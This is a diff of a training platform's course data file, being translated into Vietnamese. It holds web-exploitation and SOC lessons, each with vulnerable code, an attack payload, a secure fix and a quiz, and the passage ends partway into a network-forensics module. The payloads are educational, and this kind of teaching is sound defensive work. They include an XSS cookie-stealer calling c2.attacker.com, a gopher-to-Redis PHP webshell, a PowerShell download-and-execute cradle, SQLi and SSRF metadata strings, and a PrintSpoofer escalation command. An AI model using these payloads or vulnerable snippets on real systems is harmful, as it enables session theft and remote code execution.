@@ -4,948 +4,920 @@ import useLabStore from "./useLabStore"
 
 export const INITIAL_COURSES = [
   {
-    id: "mod-web201",
-    code: "WEB-201",
-    category: "web",
-    track: "Red Team / Offensive",
-    title: "Advanced Web Application Penetration Testing & OWASP Top 10",
-    difficulty: "Intermediate",
-    duration: "18 Hours",
-    lessonsCount: 6,
-    labsCount: 4,
-    enrolledCount: "4,120",
-    mitre: "T1190 / T1059",
-    cert: "CEH / eJPT",
-    cvssBase: "9.8 CRITICAL",
-    threatProfile: "Adversary Web Exploitation & Lateral Pivot",
-    description:
-      "Master exploitation vectors across modern single-page apps and microservices. Dive deep into SQL injection filter evasion, DOM & Reflected XSS, Server-Side Request Forgery (SSRF), and broken object-level authorization (BOLA).",
-    labLink: "/labs",
-    labId: "lab-01",
-    syllabus: [
+    "id": "mod-web201",
+    "code": "WEB-201",
+    "category": "web",
+    "track": "Red Team / Tác Chiến Tấn Công",
+    "title": "Kiểm Thử Xâm Nhập Ứng Dụng Web Nâng Cao & Lỗ Hổng OWASP Top 10",
+    "difficulty": "Trung Cấp",
+    "difficultyKey": "intermediate",
+    "duration": "18 Giờ Học",
+    "lessonsCount": 6,
+    "labsCount": 4,
+    "enrolledCount": "4,120",
+    "mitre": "T1190 / T1059",
+    "cert": "CEH / eJPT",
+    "cvssBase": "9.8 CRITICAL",
+    "threatProfile": "Khai Thác Web Độc Hại & Xâm Nhập Ngang Hàng (Lateral Pivot)",
+    "description": "Làm chủ các vector tấn công khai thác trên các ứng dụng Single-Page (SPA) và Microservices hiện đại. Đào sâu kỹ thuật bypass filter SQL Injection, DOM & Reflected XSS, SSRF (Server-Side Request Forgery) và BOLA (Broken Object-Level Authorization).",
+    "labLink": "/labs",
+    "labId": "lab-01",
+    "syllabus": [
       {
-        id: "s1",
-        title: "HTTP Protocol Internals, Header Manipulation & CORS Flaws",
-        duration: "2h 15m",
-        objective: "Analyze raw HTTP/1.1 and HTTP/2 headers, manipulate origin headers, and exploit misconfigured CORS policies.",
-        mitre: "T1190 - Exploit Public-Facing Application",
-        cve: "CWE-942: Overly Permissive CORS",
-        theory:
-          "Cross-Origin Resource Sharing (CORS) allows servers to specify who can access their assets. Misconfigured headers like 'Access-Control-Allow-Origin: null' or reflection of the Origin header with 'Access-Control-Allow-Credentials: true' allow malicious origins to read authenticated victim responses through a single victim visit.",
-        codeSnippet: `// Vulnerable CORS Middleware implementation in Node.js Express:
-app.use((req, res, next) => {
-  const origin = req.headers.origin;
-  // Flawed origin reflection regex: matches evil-bank.com.attacker.com
-  if (origin && /bank\\.com/.test(origin)) {
-    res.header('Access-Control-Allow-Origin', origin);
-    res.header('Access-Control-Allow-Credentials', 'true');
+        "id": "s1",
+        "title": "Kiến Trúc Giao Thức HTTP, Thao Túng Headers & Lỗ Hổng CORS",
+        "duration": "2h 15m",
+        "objective": "Phân tích gói tin raw HTTP/1.1 và HTTP/2, thao túng Origin headers và khai thác cấu hình sai chính sách CORS.",
+        "mitre": "T1190 - Khai thác ứng dụng Public-Facing",
+        "cve": "CWE-942: Cấu hình CORS quá lỏng lẻo (Overly Permissive CORS)",
+        "theory": "Cơ chế Cross-Origin Resource Sharing (CORS) cho phép máy chủ định danh domain nào được phép truy xuất tài nguyên bảo mật. Khi cấu hình sai lầm như phản hồi ngược Origin tùy ý của kẻ tấn công kèm cờ 'Access-Control-Allow-Credentials: true', hacker có thể đọc dữ liệu nhạy cảm của nạn nhân chỉ qua một lượt truy cập trang web độc hại.",
+        "codeSnippet": "// Cấu hình CORS lỏng lẻo trong Node.js Express:\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  // Regex phản hồi Origin có lỗ hổng: khớp với evil-bank.com.attacker.com\n  if (origin && /bank\\.com/.test(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});",
+        "codeLanguage": "javascript",
+        "payloadExample": "curl -H \"Origin: https://bank.com.attacker.site\" -H \"Cookie: session=eyJhZG1pbiI6dHJ1ZX0\" https://api.bank.com/user/credentials -i",
+        "secureSnippet": "// Cấu hình phòng thủ chuẩn Whitelist nghiêm ngặt:\nconst ALLOWED_ORIGINS = new Set([\n  'https://bank.com',\n  'https://app.bank.com'\n]);\n\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (ALLOWED_ORIGINS.has(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n    res.header('Vary', 'Origin');\n  }\n  next();\n});",
+        "quiz": {
+          "question": "Cấu hình CORS nào kết hợp cùng 'Access-Control-Allow-Credentials: true' là nguy hiểm và nghiêm trọng nhất?",
+          "options": [
+            "Access-Control-Allow-Origin: * (Wildcard kèm credentials)",
+            "Access-Control-Allow-Origin tự động phản chiếu Origin tùy ý từ request",
+            "Access-Control-Max-Age được thiết lập là 86400",
+            "Access-Control-Allow-Methods: GET, POST"
+          ],
+          "correct": 1,
+          "explanation": "Các trình duyệt hiện đại nghiêm cấm ký tự wildcard '*' khi credentials là true, nhưng việc phản hồi ngược Origin tùy ý của kẻ tấn công cho phép bypass hoàn toàn hạn chế này và đánh cắp dữ liệu xác thực."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "Khai Thác SQL Injection Nâng Cao & Kỹ Thuật Evasion WAF",
+        "duration": "3h 45m",
+        "objective": "Khai thác SQLi dựa trên Boolean/Time-based, trích xuất schema database tự động và vượt qua WAF ModSecurity.",
+        "mitre": "T1190 - Khai thác lỗ hổng cơ sở dữ liệu",
+        "cve": "CWE-89: Lỗ hổng chèn mã SQL (SQL Injection)",
+        "theory": "SQL Injection xảy ra khi dữ liệu người dùng không tin cậy được ghép trực tiếp vào câu lệnh SQL thay vì dùng tham số hóa (Parameterized Queries). Kỹ sư Red Team sử dụng các kỹ thuật như inline comments, whitespace substitution (URL encoding %09, %0a) và hàm hex/char để vượt qua các bộ lọc Regular Expression của WAF.",
+        "codeSnippet": "// Code dễ bị tổn thương với lỗ hổng SQLi:\nconst query = `SELECT id, role, password_hash FROM accounts WHERE department = '${req.query.dept}' AND status = 'ACTIVE'`;\ndb.execute(query);",
+        "codeLanguage": "javascript",
+        "payloadExample": "IT' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -",
+        "secureSnippet": "-- Bản vá an toàn: Sử dụng Prepared Statements (Parameterized Queries)\nPREPARE stmt FROM \n  'SELECT id, role, password_hash FROM accounts \n   WHERE department = ? AND status = ?';\nEXECUTE stmt USING @dept, 'ACTIVE';\nDEALLOCATE PREPARE stmt;",
+        "quiz": {
+          "question": "Phương pháp phòng ngừa nào mang lại hiệu quả tuyệt đối triệt tiêu 100% rủi ro SQL Injection?",
+          "options": [
+            "Sử dụng biểu thức chính quy (Regex) loại bỏ ký tự nháy đơn (')",
+            "Sử dụng Prepared Statements với Parameterized Queries",
+            "Mã hóa Base64 toàn bộ input trước khi đưa vào database",
+            "Chỉ cài đặt Web Application Firewall (WAF) ở tầng reverse proxy"
+          ],
+          "correct": 1,
+          "explanation": "Prepared Statements tách biệt hoàn toàn giữa cấu trúc câu lệnh SQL (AST) và dữ liệu đầu vào, khiến dữ liệu người dùng không bao giờ có thể can thiệp làm thay đổi cú pháp truy vấn."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "DOM-Based & Reflected XSS: Khai Thác Chìm Dưới Trình Duyệt",
+        "duration": "3h 00m",
+        "objective": "Xác định các Source và Sink nguy hiểm trong Javascript framework, bypass bộ lọc DOMPurify và đánh cắp JWT Token.",
+        "mitre": "T1059.007 - Javascript Client Execution",
+        "cve": "CWE-79: Cross-Site Scripting (XSS)",
+        "theory": "Cross-Site Scripting (XSS) cho phép kẻ tấn công thực thi mã Javascript độc hại trong ngữ cảnh phiên làm việc của nạn nhân. DOM-based XSS xảy ra hoàn toàn ở phía client khi dữ liệu từ các source nguy hiểm (location.search, location.hash, document.referrer) được đưa vào các sink như innerHTML, eval, document.write mà không được khử trùng (sanitization).",
+        "codeSnippet": "// Lỗ hổng DOM XSS phía client:\nconst urlParams = new URLSearchParams(window.location.search);\nconst username = urlParams.get('user');\ndocument.getElementById('welcome-message').innerHTML = `Xin chào <b>${username}</b>`;",
+        "codeLanguage": "javascript",
+        "payloadExample": "\"><img src=x onerror=\"fetch('https://c2.attacker.com/steal?cookie='+encodeURIComponent(document.cookie))\">",
+        "secureSnippet": "// Bản vá an toàn: Sử dụng textContent hoặc thư viện DOMPurify\nconst urlParams = new URLSearchParams(window.location.search);\nconst username = urlParams.get('user');\n// Sử dụng textContent đảm bảo dữ liệu luôn được coi là chuỗi văn bản thuần túy\ndocument.getElementById('welcome-message').textContent = username || 'Khách';",
+        "quiz": {
+          "question": "Thuộc tính nào của Cookie ngăn chặn mã Javascript độc hại đánh cắp session token thông qua document.cookie?",
+          "options": [
+            "Secure flag",
+            "HttpOnly flag",
+            "SameSite=Lax",
+            "Domain-scoped attribute"
+          ],
+          "correct": 1,
+          "explanation": "Cờ HttpOnly chỉ thị cho trình duyệt rằng cookie này không được phép truy cập thông qua các API client-side như document.cookie, ngăn chặn triệt để hành vi đánh cắp phiên qua XSS."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Server-Side Request Forgery (SSRF) & Khai Thác Cloud Metadata",
+        "duration": "3h 15m",
+        "objective": "Lợi dụng webhook và image fetcher để truy cập mạng nội bộ và chiếm đoạt AWS IMDSv1 token từ 169.254.169.254.",
+        "mitre": "T1190 - Khai thác SSRF nhắm vào Cloud Metadata",
+        "cve": "CWE-918: Server-Side Request Forgery (SSRF)",
+        "theory": "SSRF cho phép kẻ tấn công điều khiển máy chủ backend gửi các request đến các tài nguyên nội bộ mà hacker không thể truy cập trực tiếp từ Internet (như 127.0.0.1, dải IP mạng LAN nội bộ hoặc Cloud Metadata Service 169.254.169.254).",
+        "codeSnippet": "// Code backend dễ dính SSRF:\napp.post('/api/fetch-avatar', async (req, res) => {\n  const { imageUrl } = req.body;\n  // Không kiểm tra whitelist IP/domain, tải dữ liệu trực tiếp\n  const response = await axios.get(imageUrl);\n  res.send(response.data);\n});",
+        "codeLanguage": "javascript",
+        "payloadExample": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role",
+        "secureSnippet": "// Bản vá phòng thủ SSRF nhiều tầng:\n// 1. Chỉ chấp nhận whitelist domain được phép\n// 2. Chặn các dải IP nội bộ: 127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16\n// 3. Sử dụng AWS IMDSv2 bắt buộc session token qua HTTP PUT",
+        "quiz": {
+          "question": "Giải pháp nào của AWS vô hiệu hóa hoàn toàn vector tấn công khai thác SSRF qua Cloud Metadata 169.254.169.254?",
+          "options": [
+            "Bắt buộc nâng cấp cấu hình lên AWS IMDSv2 với PUT session token",
+            "Cấu hình AWS CloudFront cache mọi metadata requests",
+            "Đổi địa chỉ link-local từ 169.254 sang 10.0.0.1",
+            "Mở rộng Security Group cho phép outbound traffic"
+          ],
+          "correct": 0,
+          "explanation": "IMDSv2 yêu cầu gửi HTTP PUT request để lấy session token trước, sau đó mới dùng token này trong header, chặn đứng hầu hết các cuộc tấn công SSRF đơn giản chỉ hỗ trợ HTTP GET."
+        }
+      },
+      {
+        "id": "s5",
+        "title": "Lỗ Hổng Logic API, BOLA & Chiếm Quyền Điều Khiển Đối Tượng",
+        "duration": "2h 45m",
+        "objective": "Dò quét các API endpoint RESTful, kiểm tra authorization matrix và khai thác lỗi IDOR/BOLA để thay đổi hồ sơ quản trị viên.",
+        "mitre": "T1078 - Lạm dụng tài khoản hợp lệ",
+        "cve": "CWE-639: Thay Đổi Tham Số Ủy Quyền Người Dùng (IDOR / BOLA)",
+        "theory": "Broken Object Level Authorization (BOLA/IDOR) đứng vị trí số 1 trong OWASP API Security Top 10. Lỗ hổng xảy ra khi ứng dụng nhận ID đối tượng từ client (ví dụ: /api/orders/1029) nhưng không xác thực xem người dùng gửi request có thực sự sở hữu đối tượng đó hay không.",
+        "codeSnippet": "// Endpoint dính BOLA: không kiểm tra quyền sở hữu\napp.get('/api/users/:id/invoices', async (req, res) => {\n  // Lấy id từ URL params thay vì từ authenticated session\n  const invoices = await db.query('SELECT * FROM invoices WHERE user_id = ?', [req.params.id]);\n  res.json(invoices);\n});",
+        "codeLanguage": "javascript",
+        "payloadExample": "GET /api/users/1/invoices HTTP/1.1\nHost: api.target.com\nAuthorization: Bearer <token_of_user_999>",
+        "secureSnippet": "// Bản vá an toàn: Kiểm tra phân quyền dựa trên context xác thực\napp.get('/api/users/:id/invoices', verifyAuth, async (req, res) => {\n  if (req.user.id !== req.params.id && req.user.role !== 'SUPER_ADMIN') {\n    return res.status(403).json({ error: 'Truy cập bị từ chối: Bạn không sở hữu tài nguyên này' });\n  }\n  const invoices = await db.query('SELECT * FROM invoices WHERE user_id = ?', [req.params.id]);\n  res.json(invoices);\n});",
+        "quiz": {
+          "question": "Tại sao Web Application Firewall (WAF) thường hoàn toàn bất lực trước các lỗ hổng BOLA / IDOR?",
+          "options": [
+            "BOLA sử dụng phương thức mã hóa SSL 4096-bit",
+            "Request có cú pháp hoàn toàn hợp lệ, lỗ hổng nằm ở logic phân quyền tầng nghiệp vụ của ứng dụng",
+            "BOLA chỉ xảy ra trên giao thức WebSocket",
+            "WAF không thể phân tích các API định dạng JSON"
+          ],
+          "correct": 1,
+          "explanation": "WAF hoạt động dựa trên các mẫu chuỗi độc hại (signatures). Trong BOLA, request chỉ chứa các ID số hoặc UUID hoàn toàn bình thường, do đó chỉ có code nghiệp vụ mới kiểm tra được mối quan hệ sở hữu giữa user và dữ liệu."
+        }
+      },
+      {
+        "id": "s6",
+        "title": "Thực Chiến Red Team: Chuỗi Tấn Công Khai Thác Tổng Lực (Kill Chain Lab)",
+        "duration": "3h 00m",
+        "objective": "Kết hợp chuỗi lỗ hổng SSRF + BOLA + Command Injection để chiếm đặc quyền root trên máy chủ mục tiêu và trích xuất Flag.",
+        "mitre": "T1190 & T1059 - Chuỗi tấn công tổng lực",
+        "cve": "Full Kill Chain: SSRF to Remote Code Execution",
+        "theory": "Trong thực tế, các cuộc tấn công mạng nguy hiểm nhất luôn là sự kết hợp của nhiều lỗ hổng nhỏ tạo thành chuỗi tấn công (Exploit Chain). Kỹ sư Red Team liên kết từ một lỗi rò rỉ thông tin đến SSRF, từ SSRF vào dịch vụ Redis nội bộ, và từ Redis ghi SSH authorized_keys để chiếm quyền điều khiển toàn diện hệ thống.",
+        "codeSnippet": "// Mô phỏng chuỗi tấn công liên hoàn (Attack Flow):\n// 1. Dò quét API endpoint hở SSRF\n// 2. Pivot vào Redis cache nội bộ qua gopher:// protocol\n// 3. Ghi Webshell vào thư mục /var/www/html/backdoor.php\n// 4. Kích hoạt lệnh trích xuất cờ nhị phân bí mật",
+        "codeLanguage": "bash",
+        "payloadExample": "gopher://127.0.0.1:6379/_SET%20webdir%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%20%3F%3E%22%0ACONFIG%20SET%20dir%20/var/www/html%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE",
+        "secureSnippet": "// Phòng thủ tổng thể nhiều lớp (Defense in Depth):\n// 1. Phân vùng mạng VLAN / Network Segregation nghiêm ngặt\n// 2. Đặt mật khẩu mạnh (AUTH) và vô hiệu hóa các lệnh nguy hiểm (CONFIG, FLUSHALL) trong Redis\n// 3. Chạy container với cờ Read-Only Root Filesystem",
+        "quiz": {
+          "question": "Chiến lược phòng thủ kiến trúc nào ngăn chặn hiệu quả nhất việc kẻ tấn công pivot từ một ứng dụng web bị xâm nhập sang các dịch vụ nội bộ khác?",
+          "options": [
+            "Mô hình Zero Trust và phân đoạn mạng siêu nhỏ (Micro-segmentation)",
+            "Tăng thời gian timeout của phiên HTTP lên 24 giờ",
+            "Tắt tính năng log của máy chủ web",
+            "Chỉ cho phép truy cập website qua giao thức HTTP/1.0"
+          ],
+          "correct": 0,
+          "explanation": "Zero Trust và Micro-segmentation cô lập các ứng dụng trong từng mạng riêng biệt, kiểm soát nghiêm ngặt egress traffic và chỉ cho phép giao tiếp giữa các thành phần được cấp phép rõ ràng."
+        }
+      }
+    ]
+  },
+  {
+    "id": "mod-soc101",
+    "code": "SOC-101",
+    "category": "defensive",
+    "track": "Blue Team / Giám Sát SOC & Phân Tích Mối Đe Dọa",
+    "title": "Vận Hành SOC, Săn Lùng Mối Đe Dọa SIEM & Elastic Logstash",
+    "difficulty": "Cơ Bản",
+    "difficultyKey": "novice",
+    "duration": "14 Giờ Học",
+    "lessonsCount": 5,
+    "labsCount": 3,
+    "enrolledCount": "3,890",
+    "mitre": "T1078 / T1059",
+    "cert": "CompTIA CySA+ / SOC Analyst",
+    "cvssBase": "8.5 HIGH",
+    "threatProfile": "Phát Hiện Tấn Công APT & Cảnh Báo SIEM (Detection Engineering)",
+    "description": "Học cách thiết lập hệ thống giám sát an ninh mạng trung tâm SOC, xây dựng pipeline thu thập log với Elastic Stack, chuẩn hóa chuẩn Sigma rules và điều tra các chiến dịch tấn công APT theo ma trận MITRE ATT&CK.",
+    "labLink": "/labs",
+    "labId": "lab-02",
+    "syllabus": [
+      {
+        "id": "s1",
+        "title": "Kiến Trúc Trung Tâm Giám Sát SOC & Phân Tích Mô Hình Kim Tự Tháp Nỗi Đau (Pyramid of Pain)",
+        "duration": "2h 30m",
+        "objective": "Nắm vững quy trình xử lý cảnh báo SOC L1/L2/L3 và phân loại Indicators of Compromise (IoC) theo thang đo độ khó của đối thủ.",
+        "mitre": "T1078 - Lạm dụng tài khoản hợp lệ",
+        "cve": "NIST SP 800-61 Rev 2: Quản Lý Sự Cố An Ninh Mạng",
+        "theory": "Kim tự tháp nỗi đau (Pyramid of Pain) của David Bianco chỉ ra mức độ khó khăn mà kẻ tấn công phải đối mặt khi bị phát hiện. Chặn Hash hay IP chỉ gây bất tiện nhỏ, nhưng phát hiện và triệt tiêu TTPs (Chiến thuật, Kỹ thuật và Quy trình) sẽ buộc hacker phải tái cấu trúc toàn bộ chiến dịch tấn công.",
+        "codeSnippet": "// Ví dụ cấu hình Logstash Pipeline phân loại mức độ nghiêm trọng:\nfilter {\n  if [event_id] == 4625 {\n    mutate { add_field => { \"alert_severity\" => \"MEDIUM\" } }\n    mutate { add_tag => [ \"failed_logon_attempt\" ] }\n  }\n}",
+        "codeLanguage": "ruby",
+        "payloadExample": "tail -f /var/log/suricata/eve.json | jq 'select(.alert.severity == 1)'",
+        "secureSnippet": "// Cấu hình giám sát SIEM chuẩn:\n// 1. Tự động hóa tương quan sự kiện (Correlation Rules)\n// 2. Tích hợp Threat Intelligence Feed (STIX/TAXII)\n// 3. Kích hoạt phản hồi tự động SOAR khi phát hiện TTP nguy cấp",
+        "quiz": {
+          "question": "Tầng nào trên đỉnh Kim tự tháp nỗi đau (Pyramid of Pain) gây khó khăn lớn nhất và tốn kém nhất cho kẻ tấn công khi bị chặn?",
+          "options": [
+            "Địa chỉ IP (IP Addresses)",
+            "Mã băm tập tin (Hash Values)",
+            "Chiến thuật, Kỹ thuật và Quy trình (TTPs)",
+            "Tên miền mạng (Domain Names)"
+          ],
+          "correct": 2,
+          "explanation": "TTPs đại diện cho thói quen và kỹ năng tác chiến cốt lõi của kẻ tấn công. Khi TTP bị vô hiệu hóa, đối thủ phải học lại kỹ năng hoặc đầu tư nghiên cứu các phương thức tấn công hoàn toàn mới."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "Thu Thập Nhật Ký Sự Kiện Windows Event Logs & Phân Tích Sysmon",
+        "duration": "3h 15m",
+        "objective": "Cấu hình Microsoft Sysmon để phát hiện tiến trình độc hại, hành vi Process Injection và trích xuất bộ nhớ LSASS.",
+        "mitre": "T1059.001 - PowerShell Execution",
+        "cve": "Sysmon Event ID 1 & 10: Khởi Tạo Tiến Trình & Truy Cập Bộ Nhớ",
+        "theory": "Sysmon cung cấp khả năng giám sát sâu trên Windows. Event ID 1 ghi nhận chi tiết dòng lệnh khởi tạo tiến trình (ParentImage, CommandLine, Hash). Event ID 10 phát hiện các hành vi mở handle vào tiến trình nhạy cảm như lsass.exe để trích xuất mật khẩu qua Mimikatz.",
+        "codeSnippet": "<!-- Cấu hình XML Sysmon phát hiện truy cập LSASS trái phép -->\n<Sysmon schemaversion=\"4.90\">\n  <EventFiltering>\n    <ProcessAccess onmatch=\"include\">\n      <TargetImage condition=\"end with\">lsass.exe</TargetImage>\n      <GrantedAccess condition=\"is\">0x1010</GrantedAccess>\n    </ProcessAccess>\n  </EventFiltering>\n</Sysmon>",
+        "codeLanguage": "xml",
+        "payloadExample": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 50",
+        "secureSnippet": "<!-- Quy tắc phòng thủ Sysmon: Chặn quyền truy cập không cần thiết vào LSASS -->\n<!-- Bật tính năng RunAsPPL (Protected Process Light) trên Windows Server -->\n<!-- Đăng ký Credential Guard qua Group Policy -->",
+        "quiz": {
+          "question": "Sysmon Event ID nào ghi lại chi tiết các tiến trình được tạo mới kèm mã băm SHA-256 và command-line đầy đủ?",
+          "options": [
+            "Event ID 1 (Process Create)",
+            "Event ID 3 (Network Connection)",
+            "Event ID 7 (Image Loaded)",
+            "Event ID 11 (File Create)"
+          ],
+          "correct": 0,
+          "explanation": "Sysmon Event ID 1 là sự kiện cốt lõi của việc phát hiện tiến trình độc hại, ghi nhận ProcessId, Image path, CommandLine, ParentProcessId và Hashes."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "Xây Dựng Quy Tắc Cảnh Báo Phát Hiện Mối Đe Dọa Với Chuẩn Sigma Rules",
+        "duration": "2h 45m",
+        "objective": "Viết các quy tắc phát hiện độc lập bằng chuẩn Sigma và biên dịch tự động sang cú pháp truy vấn Elasticsearch DSL và Splunk SPL.",
+        "mitre": "T1059.001 - PowerShell Obfuscation",
+        "cve": "Sigma Detection Rule: Mã Độc PowerShell Tải Về Payload",
+        "theory": "Sigma là tiêu chuẩn định dạng quy tắc phát hiện mối đe dọa mở (Open Detection Format) tương tự như chuẩn Yara cho mã độc hay Suricata cho gói tin mạng. Quy tắc Sigma được viết bằng cú pháp YAML dễ hiểu và có thể chuyển đổi sang mọi nền tảng SIEM thông qua công cụ sigmac.",
+        "codeSnippet": "title: Phát Hiện PowerShell Tải File Qua WebClient\nid: b5e43a90-32b0-4f81-a67b-123456789abc\nstatus: production\ndescription: Phát hiện lệnh powershell sử dụng System.Net.WebClient DownloadString\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'DownloadString'\n    condition: selection\nlevel: high",
+        "codeLanguage": "yaml",
+        "payloadExample": "powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.10.14.89/agent.ps1'))\"",
+        "secureSnippet": "# Phòng thủ chủ động:\n# 1. Bật PowerShell Constrained Language Mode\n# 2. Bật Script Block Logging (Event ID 4104)\n# 3. Kích hoạt tính năng Windows Defender Application Control (WDAC)",
+        "quiz": {
+          "question": "Lợi ích cốt lõi lớn nhất khi kỹ sư SOC viết quy tắc phát hiện bằng chuẩn Sigma Rule là gì?",
+          "options": [
+            "Tự động vá lỗi hệ điều hành trong 5 giây",
+            "Độc lập với nền tảng SIEM, có thể biên dịch sang Splunk, Elastic, Sentinel hay QRadar",
+            "Thay thế hoàn toàn sự cần thiết của tường lửa mạng",
+            "Mã hóa toàn bộ ổ cứng người dùng"
+          ],
+          "correct": 1,
+          "explanation": "Sigma mang tính trung lập về nền tảng (Vendor-Agnostic), cho phép chia sẻ tri thức phát hiện giữa các nhóm SOC và chuyển đổi linh hoạt sang bất kỳ SIEM nào."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Săn Lùng Mối Đe Dọa Tấn Công Leo Thang Đặc Quyền (Privilege Escalation Hunting)",
+        "duration": "3h 00m",
+        "objective": "Săn lùng các kỹ thuật khai thác dịch vụ Windows không an toàn (Unquoted Service Paths) và lạm dụng token SeImpersonatePrivilege.",
+        "mitre": "T1548 - Lạm dụng cơ chế leo thang đặc quyền",
+        "cve": "JuicyPotato / PrintSpoofer Token Impersonation",
+        "theory": "Sau khi có quyền truy cập ban đầu dưới dạng tài khoản dịch vụ (như IIS AppPool, SQL Server Service), kẻ tấn công sẽ tìm cách lạm dụng token đặc quyền SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege để mạo danh tài khoản NT AUTHORITY\\SYSTEM.",
+        "codeSnippet": "// Kiểm tra đặc quyền tài khoản trong cmd:\nwhoami /priv\n\n// Cảnh báo SIEM: Phát hiện lệnh PrintSpoofer / JuicyPotato\nSELECT * FROM win_events WHERE command_line LIKE '%PrintSpoofer%' OR command_line LIKE '%-i -c%'",
+        "codeLanguage": "sql",
+        "payloadExample": "PrintSpoofer.exe -i -c \"powershell -c Start-Process cmd.exe -Verb RunAs\"",
+        "secureSnippet": "// Khắc phục & làm sạch quyền:\n// 1. Gỡ bỏ quyền SeImpersonatePrivilege khỏi các service account thông thường\n// 2. Chạy ứng dụng dưới dạng Virtual Accounts hoặc Managed Service Accounts (gMSA)",
+        "quiz": {
+          "question": "Đặc quyền Windows nào thường bị kẻ tấn công lạm dụng qua công cụ PrintSpoofer để leo thang từ dịch vụ lên SYSTEM?",
+          "options": [
+            "SeShutdownPrivilege",
+            "SeImpersonatePrivilege",
+            "SeTimeZonePrivilege",
+            "SeUndockPrivilege"
+          ],
+          "correct": 1,
+          "explanation": "SeImpersonatePrivilege cho phép tiến trình mạo danh danh tính bảo mật của bất kỳ client nào kết nối đến Named Pipe được tạo bởi tiến trình đó, tạo điều kiện chiếm quyền SYSTEM."
+        }
+      },
+      {
+        "id": "s5",
+        "title": "Diễn Tập Quy Trình Ứng Cứu Sự Cố (Incident Response Playbook: Ransomware Containment)",
+        "duration": "2h 30m",
+        "objective": "Thực hành quy trình cô lập máy trạm nhiễm mã độc, thu hồi khóa giải mã tạm thời và khôi phục hoạt động kinh doanh.",
+        "mitre": "T1486 - Mã hóa dữ liệu tống tiền (Data Encrypted for Impact)",
+        "cve": "Playbook: Cách ly máy chủ bị mã hóa dữ liệu trong 15 phút",
+        "theory": "Khi mã độc tống tiền (Ransomware) bùng phát, tốc độ phản ứng là yếu tố sống còn. Playbook ứng cứu sự cố quy định các bước chuẩn: 1. Phát hiện & Nhận diện chủng loại mã độc; 2. Cô lập mạng máy chủ lập tức; 3. Thu thập bằng chứng RAM; 4. Truy tìm tài khoản khởi phát; 5. Khôi phục từ bản sao lưu độc lập (Immutable Backup).",
+        "codeSnippet": "#!/bin/bash\n# Script cô lập máy trạm Linux khẩn cấp qua iptables:\niptables -F\niptables -A INPUT -s 10.10.10.5 -j ACCEPT # Chỉ cho phép IP của máy phân tích IR\niptables -A OUTPUT -d 10.10.10.5 -j ACCEPT\niptables -P INPUT DROP\niptables -P OUTPUT DROP\necho \"[ALERT] Host isolated. Forensic triage in progress.\"",
+        "codeLanguage": "bash",
+        "payloadExample": "netsh advfirewall set allprofiles state on && netsh advfirewall firewall add rule name=\"Block All Outbound\" dir=out action=block",
+        "secureSnippet": "# Khuyến nghị kiến trúc ứng phó:\n# 1. Triển khai EDR với tính năng One-Click Host Isolation\n# 2. Lưu trữ bản sao lưu ngoại tuyến (Air-gapped) hoặc WORM (Write Once, Read Many)\n# 3. Định kỳ tổ chức diễn tập Tabletop Exercise ứng phó khủng hoảng",
+        "quiz": {
+          "question": "Hành động đầu tiên và khẩn cấp nhất mà chuyên viên IR cần thực hiện khi phát hiện một máy trạm trong mạng LAN đang thực hiện hành vi mã hóa file hàng loạt là gì?",
+          "options": [
+            "Khởi động lại máy tính nạn nhân ngay lập tức",
+            "Gửi email cảnh báo toàn thể nhân viên công ty",
+            "Cô lập máy trạm khỏi mạng (Network Isolation) để chặn mã độc lây lan sang các máy khác",
+            "Xóa toàn bộ thư mục tạm thời trên ổ đĩa C"
+          ],
+          "correct": 2,
+          "explanation": "Cô lập mạng ngay lập tức cắt đứt liên lạc C2 của mã độc và ngăn chặn hành vi lây lan ngang hàng (Lateral Movement) sang các máy chủ lưu trữ dữ liệu khác trong doanh nghiệp."
+        }
+      }
+    ]
+  },
+  {
+    "id": "mod-net301",
+    "code": "NET-301",
+    "category": "network",
+    "track": "Network Forensics / Điều Tra Gói Tin & Phân Tích Mạng",
+    "title": "Điều Tra Gói Tin Mạng, Phân Tích Giao Thức Wireshark & Tấn Công MITM",
+    "difficulty": "Trung Cấp",
+    "difficultyKey": "intermediate",
+    "duration": "16 Giờ Học",
+    "lessonsCount": 5,
+    "labsCount": 4,
+    "enrolledCount": "2,940",
+    "mitre": "T1040 / T1557",
+    "cert": "Wireshark WCNA / GCFA",
+    "cvssBase": "8.2 HIGH",
+    "threatProfile": "Nghe Lén Mạng Cục Bộ & Chiếm Đoạt Phiên Truyền Dữ Liệu",
+    "description": "Giải mã sâu các gói tin PCAP trong Wireshark và tshark, phát hiện kỹ thuật tấn công đầu độc bộ nhớ ARP Poisoning, giải mã luồng TLS và truy vết kênh truyền dữ liệu ngầm DNS Tunneling.",
+    "labLink": "/labs",
+    "labId": "lab-03",
+    "syllabus": [
+      {
+        "id": "s1",
+        "title": "Kiến Trúc Phân Lớp Mô Hình TCP/IP & Kỹ Thuật Bắt Gói Tin Bằng TShark/Wireshark",
+        "duration": "2h 45m",
+        "objective": "Làm chủ bộ lọc hiển thị (Display Filters), bộ lọc bắt gói (Capture Filters) và trích xuất dữ liệu tự động với tshark.",
+        "mitre": "T1040 - Nghe lén lưu lượng mạng (Network Sniffing)",
+        "cve": "Network Forensics: Trích Xuất Payload Từ Gói Tin Raw PCAP",
